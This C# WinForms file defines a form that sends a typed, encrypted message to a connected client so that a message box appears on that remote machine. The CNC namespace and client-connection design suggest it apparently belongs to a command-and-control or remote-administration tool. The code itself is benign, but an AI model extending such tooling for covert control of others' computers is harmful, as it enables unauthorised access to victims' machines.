using CNC.Core.Data;
using CNC.Core.Security;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC.Forms
{
    public partial class ShowMessageBox : Form
    {
        private Client currentClient;
        public ShowMessageBox(Client client)
        {
            currentClient = client;
            InitializeComponent();
        }

        private void btnPreview_Click(object sender, EventArgs e)
        {
            MessageBox.Show(txtMessage.Text);
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            currentClient.Connection.SendObject<string>("ShowMessageBoxReq", Cryptography.Encrypt(txtMessage.Text));
        }
    }
}
